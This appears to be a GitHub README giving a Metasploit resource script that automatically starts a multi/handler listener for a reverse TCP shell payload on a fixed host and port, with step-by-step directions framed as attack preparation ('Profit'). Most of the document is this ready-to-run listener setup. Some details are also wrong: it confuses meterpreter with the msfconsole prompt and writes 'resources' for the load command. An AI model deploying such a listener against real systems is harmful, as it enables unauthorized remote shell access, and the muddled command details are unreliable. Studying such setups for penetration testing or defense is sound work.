# Auto Meta

Auto start script example for meterperter

## Directions

1. Make a script to use for your attack. (mine will setup ip, port, payload, start background job)
2. Load the script in meterpreter
3. Profit. 


## Example

Name your file with .rb extension for Ruby. 

Script example `startup.rb`

```ruby
<ruby>

host = '10.10.10.10'
port = 8089
payload = 'generic/shell_reverse_tcp'

print("Setting up Fox exploit handler")

run_single("use exploit/multi/handler")
run_single("set payload #{payload}")
run_single("set LHOST #{host}")
run_single("set LPORT #{port}")
run_single("set ExitOnSession false")
run_single("run -j")

run_single("jobs")
run_single("back")
</ruby>
```

To use in meterpreter, open meterpreter.

```
msf6> resources startup.rb
```

In this script we have...

1. Set the handler
2. Set the payload
3. Set the LHOST
4. Set the LPORT
5. Set ExitOnSession false
6. Ran as a job in he background
7. List the job (check its running)
8. Set back command to return to normal meterpreter shell ready for next. 


## Screenshot

![image](https://user-images.githubusercontent.com/5285547/182806915-99214152-3fa9-4fa1-9c1d-651e179fbf7a.png)



